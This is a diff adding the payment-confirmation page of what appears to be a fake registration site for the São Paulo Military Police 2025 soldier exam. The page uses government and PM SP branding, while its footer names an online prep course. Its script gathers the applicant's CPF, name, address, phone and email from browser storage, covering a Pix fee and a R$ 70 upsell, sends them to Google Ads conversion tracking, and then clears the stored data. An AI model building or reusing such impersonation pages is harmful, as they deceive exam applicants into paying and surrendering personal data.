@@ -1,0 +1,482 @@
+﻿<!doctype html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <title>Inscrição Confirmada - PM SP 2025</title>
+
+        <!-- Microsoft Clarity Analytics -->
+        <script type="text/javascript">
+            (function (c, l, a, r, i, t, y) {
+                c[a] =
+                    c[a] ||
+                    function () {
+                        (c[a].q = c[a].q || []).push(arguments);
+                    };
+                t = l.createElement(r);
+                t.async = 1;
+                t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0];
+                y.parentNode.insertBefore(t, y);
+            })(window, document, "clarity", "script", "t84urj3twx");
+        </script>
+
+        <!-- Google Ads Gtag.js -->
+        <script async="" src="../../gtag/js-2.js?id=AW-17558615378"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag() {
+                dataLayer.push(arguments);
+            }
+            gtag("js", new Date());
+            gtag("config", "AW-17558615378");
+        </script>
+
+        <!-- Tailwind CSS -->
+        <script src="../../3.4-2.17"></script>
+        <script src="../../3.4.16-6.js"></script>
+        <link href="../css/all.min-8.css" rel="stylesheet">
+        <link href="../css/home-8.css" rel="stylesheet">
+
+        <style>
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            .success-icon {
+                animation: pulse 2s infinite;
+            }
+            @keyframes pulse {
+                0% {
+                    transform: scale(1);
+                }
+                50% {
+                    transform: scale(1.05);
+                }
+                100% {
+                    transform: scale(1);
+                }
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+            }
+        </style>
+    </head>
+
+    <body class="flex flex-col min-h-screen">
+        <header class="gov-header text-white py-2">
+            <div class="container mx-auto flex justify-between items-center px-4">
+                <a class="font-bold text-sm" href="#">
+                    <img src="../images/top_gov-5-7.jpg" alt="Logotipo" class="h-6">
+                </a>
+                <nav>
+                    <ul class="flex space-x-4 text-[10px]">
+                        <li>
+                            <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">PARTICIPE</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">SERVIÇOS</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+
+        <div class="inep-header py-3">
+            <div class="container mx-auto px-4">
+                <img src="../images/pmsp-8.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+            </div>
+        </div>
+
+        <main class="flex-grow py-8">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="text-center mb-6"></div>
+
+                <div class="border border-gray-300 rounded">
+                    <div class="bg-green-600 text-white py-3 px-4 text-center">
+                        <h2 class="text-lg font-semibold">
+                            Pagamento Confirmado ✅
+                        </h2>
+                    </div>
+
+                    <div class="p-8 text-center">
+                        <div class="success-icon mb-6">
+                            <div class="bg-green-100 p-6 rounded-full inline-flex items-center justify-center">
+                                <i class="fas fa-check-circle text-green-600 text-6xl"></i>
+                            </div>
+                        </div>
+
+                        <h3 class="text-2xl font-bold text-gray-800 mb-4">
+                            Inscrição Confirmada!
+                        </h3>
+
+                        <div class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
+                            <p class="text-green-800 font-medium mb-2">
+                                🎉 Parabéns! Seu pagamento foi processado com sucesso.
+                            </p>
+                            <p class="text-green-700 text-sm">
+                                Sua inscrição no Concurso PM SP 2025 - Soldado 2ª Classe está confirmada e você receberá todas as informações necessárias em breve.
+                            </p>
+                        </div>
+
+                        <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                            <h4 class="font-semibold text-blue-800 mb-2">
+                                📋 Próximos Passos:
+                            </h4>
+                            <ul class="text-blue-700 text-sm text-left space-y-1">
+                                <li>
+                                    • Acompanhe seu email para comunicados importantes
+                                </li>
+                                <li>• Guarde o comprovante de pagamento</li>
+                                <li>
+                                    • Fique atento às datas de aplicação das provas
+                                </li>
+                                <li>
+                                    • Acesse o site oficial para consultar locais de prova
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="bg-gray-50 rounded-lg p-4 mb-6">
+                            <h4 class="font-semibold text-gray-800 mb-2">
+                                📄 Detalhes da Inscrição
+                            </h4>
+                            <div class="text-sm text-gray-600 space-y-1">
+                                <p><strong>Valor pago:</strong> R$ 85,00</p>
+                                <p>
+                                    <strong>Data:</strong>
+                                    <span id="payment-date"></span>
+                                </p>
+                                <p>
+                                    <strong>Status:</strong>
+                                    <span class="text-green-600 font-medium">Confirmado</span>
+                                </p>
+                            </div>
+                        </div>
+
+                        <div class="space-y-3">
+                            <button onclick="window.print()" class="w-full bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700 transition-colors">
+                                <i class="fas fa-print mr-2"></i>
+                                Imprimir Comprovante
+                            </button>
+
+                            <a href="../../" class="block w-full bg-gray-600 text-white px-6 py-3 rounded-lg hover:bg-gray-700 transition-colors text-center">
+                                <i class="fas fa-home mr-2"></i>
+                                Voltar ao Início
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer-bg text-white py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                    <img src="../images/pmsp-8.png" alt="PM SP logo" height="30" width="60" style="object-fit: contain">
+                    <p class="text-sm text-center mb-2">
+Curso Preparatório Online - Concursos 2025
+                    </p>
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; PM SP - Polícia Militar de São Paulo</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-phone-alt mr-1"></i> 0800 616161
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                
+                // Mostrar data atual
+                const now = new Date();
+                const dateString =
+                    now.toLocaleDateString("pt-BR") +
+                    " às " +
+                    now.toLocaleTimeString("pt-BR");
+                
+                const paymentDateElement = document.getElementById("payment-date");
+                if (paymentDateElement) {
+                    paymentDateElement.textContent = dateString;
+                }
+
+                // 🧹 FUNÇÃO DE LIMPEZA GARANTIDA (sempre executa)
+                function cleanupData() {
+                    console.log("🧹 Iniciando limpeza completa de dados...");
+                    
+                    // LocalStorage - remover todos os dados sensíveis
+                    const localStorageKeysToRemove = [
+                        "currentPix", "currentPixUpsell", "paymentData",
+                        "cpfData", "enderecoData", "emailConfirmacao", "upsellPaid",
+                        "utmParams", "gclid", "gad_source", "gad_campaignid",
+                        "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
+                        "questionarioData", "dadosInscricao", "tempUserData"
+                    ];
+                    
+                    localStorageKeysToRemove.forEach(key => {
+                        if (localStorage.getItem(key)) {
+                            localStorage.removeItem(key);
+                            console.log(`🗑️ Removido localStorage: ${key}`);
+                        }
+                    });
+                    
+                    // SessionStorage - limpeza completa
+                    const sessionStorageKeysToRemove = [
+                        "currentPix", "currentPixUpsell", "paymentData",
+                        "cpfData", "enderecoData", "emailConfirmacao",
+                        "utmParams", "questionarioData", "tempData", "formData"
+                    ];
+                    
+                    sessionStorageKeysToRemove.forEach(key => {
+                        if (sessionStorage.getItem(key)) {
+                            sessionStorage.removeItem(key);
+                            console.log(`🗑️ Removido sessionStorage: ${key}`);
+                        }
+                    });
+                    
+                    console.log("✅ Limpeza completa finalizada - Dados removidos do localStorage e sessionStorage");
+                }
+
+                // 🎯 CONVERSÃO CONDICIONAL GOOGLE ADS - UPSELL (R$ 91,90)
+                try {
+                    // Recuperar dados do pagamento e usuário
+                    const paymentData = localStorage.getItem("paymentData");
+                    const currentPix = localStorage.getItem("currentPix");
+                    const currentPixUpsell = localStorage.getItem("currentPixUpsell");
+                    const upsellPaid = localStorage.getItem("upsellPaid");
+                    const cpfData = localStorage.getItem("cpfData");
+                    const enderecoData = localStorage.getItem("enderecoData");
+                    const emailConfirmacao = localStorage.getItem("emailConfirmacao");
+                    
+                    // Recuperar parâmetros do Google Ads
+                    const gclid = localStorage.getItem('gclid');
+                    const gad_source = localStorage.getItem('gad_source');
+                    const gad_campaignid = localStorage.getItem('gad_campaignid');
+                    const utm_source = localStorage.getItem('utm_source');
+                    const utm_campaign = localStorage.getItem('utm_campaign');
+
+                    console.log("📊 Dados recuperados:", {
+                        hasPaymentData: !!paymentData,
+                        hasCurrentPix: !!currentPix,
+                        hasCurrentPixUpsell: !!currentPixUpsell,
+                        hasUpsellPaid: upsellPaid,
+                        hasGclid: !!gclid,
+                        hasCpfData: !!cpfData,
+                        hasEnderecoData: !!enderecoData
+                    });
+
+                    // ⚠️ GATE: Só enviar conversão de upsell se realmente houve pagamento
+                    if (!currentPixUpsell || upsellPaid !== 'true') {
+                        console.log("🚫 Não há upsell pago - pulando conversão de upsell");
+                        return;
+                    }
+
+                    // Verificar se gtag está disponível
+                    if (typeof gtag === "undefined") {
+                        console.warn("⚠️ Google Ads gtag não está disponível");
+                        return;
+                    }
+
+                    // Gerar ID da transação único para o upsell
+                    let transactionId = "upsell_" + Date.now();
+                    
+                    try {
+                        const pixUpsellData = JSON.parse(currentPixUpsell);
+                        transactionId = pixUpsellData.payment_code + "_upsell_curso";
+                    } catch (e) {
+                        console.log("Erro ao parsear currentPixUpsell:", e);
+                    }
+
+                    // 🛡️ PROTEÇÃO CONTRA CONVERSÃO DUPLICADA DE UPSELL POR CPF
+                    function checkUpsellConversionByCPF() {
+                        try {
+                            // Buscar dados do CPF no localStorage
+                            if (!cpfData) {
+                                console.warn("⚠️ Dados do CPF não encontrados para upsell");
+                                return { shouldSend: false, reason: "CPF não encontrado" };
+                            }
+
+                            const cpfInfo = JSON.parse(cpfData);
+                            const cpf = cpfInfo?.DADOS?.CPF || cpfInfo?.cpf;
+                            
+                            if (!cpf) {
+                                console.warn("⚠️ CPF não encontrado nos dados para upsell");
+                                return { shouldSend: false, reason: "CPF inválido" };
+                            }
+
+                            // Normalizar CPF (apenas dígitos) e criar chave específica para upsell
+                            const cpfDigits = cpf.replace(/\D/g, "");
+                            const upsellConversionKey = `pmsp_upsell_conversion_sent_${cpfDigits}`;
+                            
+                            // Verificar se já foi enviada conversão de upsell para este CPF
+                            const alreadySent = localStorage.getItem(upsellConversionKey);
+                            
+                            if (alreadySent) {
+                                const sentDate = new Date(parseInt(alreadySent));
+                                console.log(`🚫 Conversão upsell (R$ 91,90) já enviada para CPF ${cpfDigits.substring(0,3)}***.***-** em ${sentDate.toLocaleString('pt-BR')}`);
+                                return { shouldSend: false, reason: "CPF já enviou conversão upsell", cpf: cpfDigits };
+                            } else {
+                                console.log(`✅ Primeira conversão upsell (R$ 91,90) para CPF ${cpfDigits.substring(0,3)}***.***-**, enviando...`);
+                                return { shouldSend: true, cpf: cpfDigits, conversionKey: upsellConversionKey };
+                            }
+                            
+                        } catch (error) {
+                            console.error("❌ Erro ao verificar CPF para upsell:", error);
+                            return { shouldSend: false, reason: "Erro na verificação" };
+                        }
+                    }
+
+                    const upsellConversionCheck = checkUpsellConversionByCPF();
+                    
+                    // Só continuar se CPF ainda não enviou conversão de upsell
+                    if (!upsellConversionCheck.shouldSend) {
+                        console.log(`🚫 Pulando conversão upsell: ${upsellConversionCheck.reason}`);
+                        return;
+                    }
+
+                    // Preparar dados do usuário para Enhanced Conversions
+                    let userData = {};
+                    
+                    // Email
+                    if (emailConfirmacao) {
+                        userData.email = emailConfirmacao.toLowerCase().trim();
+                    }
+                    
+                    // Telefone no formato E.164
+                    if (enderecoData) {
+                        try {
+                            const endereco = JSON.parse(enderecoData);
+                            if (endereco.telefone) {
+                                let phone = endereco.telefone.replace(/\D/g, '');
+                                if (!phone.startsWith('55')) {
+                                    phone = '55' + phone;
+                                }
+                                userData.phone_number = '+' + phone;
+                            }
+                            
+                            // Endereço estruturado
+                            if (endereco.logradouro && endereco.cidade) {
+                                userData.address = {
+                                    street: endereco.logradouro + (endereco.numero ? ' ' + endereco.numero : ''),
+                                    city: endereco.cidade.toLowerCase(),
+                                    region: endereco.uf || '',
+                                    postal_code: endereco.cep ? endereco.cep.replace(/\D/g, '') : '',
+                                    country: 'BR'
+                                };
+                                
+                                if (endereco.complemento) {
+                                    userData.address.street += ' ' + endereco.complemento;
+                                }
+                            }
+                        } catch (e) {
+                            console.log("Erro ao processar endereço:", e);
+                        }
+                    }
+                    
+                    // Nome do usuário
+                    if (cpfData) {
+                        try {
+                            const cpf = JSON.parse(cpfData);
+                            if (cpf.DADOS && cpf.DADOS.NOME) {
+                                const nomeCompleto = cpf.DADOS.NOME.toLowerCase().trim();
+                                const partesNome = nomeCompleto.split(' ');
+                                
+                                if (partesNome.length > 0) {
+                                    userData.address = userData.address || {};
+                                    userData.address.first_name = partesNome[0];
+                                    userData.address.last_name = partesNome[partesNome.length - 1];
+                                }
+                            }
+                        } catch (e) {
+                            console.log("Erro ao processar nome:", e);
+                        }
+                    }
+
+                    // 🔥 EVENTO DE CONVERSÃO EXPLÍCITA - R$ 70,00
+                    const conversionData = {
+                        send_to: "AW-17558615378/PyemCJi1i5wbENLqzLRB",
+                        value: 70.00,
+                        currency: "BRL",
+                        transaction_id: transactionId,
+                        custom_parameters: {
+                            upsell: true,
+                            upsell_type: "cursobr_preparatorio",
+                            conversion_type: "explicit_upsell",
+                            original_conversion: false,
+                            product_name: "Curso BR Preparatório Online",
+                            conversion_timestamp: now.getTime()
+                        }
+                    };
+                    
+                    // Adicionar gclid para melhor atribuição
+                    if (gclid) {
+                        conversionData.gclid = gclid;
+                    }
+                    
+                    // Adicionar dados de Enhanced Conversions
+                    if (Object.keys(userData).length > 0) {
+                        conversionData.user_data = userData;
+                    }
+                    
+                    // 🚀 DISPARAR CONVERSÃO COM CONFIRMAÇÃO DE ENTREGA
+                    conversionData.event_callback = function() {
+                        // Marcar conversão upsell como enviada APENAS após confirmação
+                        if (upsellConversionCheck.conversionKey) {
+                            localStorage.setItem(upsellConversionCheck.conversionKey, Date.now().toString());
+                            console.log(`✅ CPF ${upsellConversionCheck.cpf.substring(0,3)}***.***-** marcado como conversão upsell enviada`);
+                        }
+                    };
+                    
+                    gtag("event", "conversion", conversionData);
+                    
+                    // Fallback: marcar como enviado após 3 segundos mesmo sem callback
+                    setTimeout(() => {
+                        if (upsellConversionCheck.conversionKey && !localStorage.getItem(upsellConversionCheck.conversionKey)) {
+                            localStorage.setItem(upsellConversionCheck.conversionKey, Date.now().toString());
+                            console.log(`⏰ Timeout: CPF ${upsellConversionCheck.cpf.substring(0,3)}***.***-** marcado como upsell enviado (fallback)`);
+                        }
+                    }, 3000);
+
+                    console.log("✅ CONVERSÃO UPSELL CONDICIONAL ENVIADA:", {
+                        conversion_id: "AW-17558615378/PyemCJi1i5wbENLqzLRB",
+                        value: "R$ 70,00",
+                        transaction_id: transactionId,
+                        type: "curso_preparatorio",
+                        gclid: gclid || 'não disponível',
+                        campaign_id: gad_campaignid || 'não disponível',
+                        enhanced_conversions: Object.keys(userData).length > 0,
+                        timestamp: dateString
+                    });
+
+                    // Também enviar evento de purchase para métricas
+                    gtag("event", "purchase", {
+                        transaction_id: transactionId,
+                        value: 70.00,
+                        currency: "BRL",
+                        items: [{
+                            item_id: "curso_brpreparatorio_online",
+                            item_name: "Curso BR Preparatório Online",
+                            category: "Education",
+                            quantity: 1,
+                            price: 70.00
+                        }]
+                    });
+
+                } catch (error) {
+                    console.error("❌ Erro ao processar conversão:", error);
+                } finally {
+                    // 🧹 EXECUTAR LIMPEZA GARANTIDA (sempre executa via finally)
+                    setTimeout(cleanupData, 2000); // Aguarda 2 segundos para garantir que conversões foram enviadas
+                }
+            });
+        </script>
+    <script defer="" src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-8" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"a85dcd35d0ac4aa4b520758cac699320","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
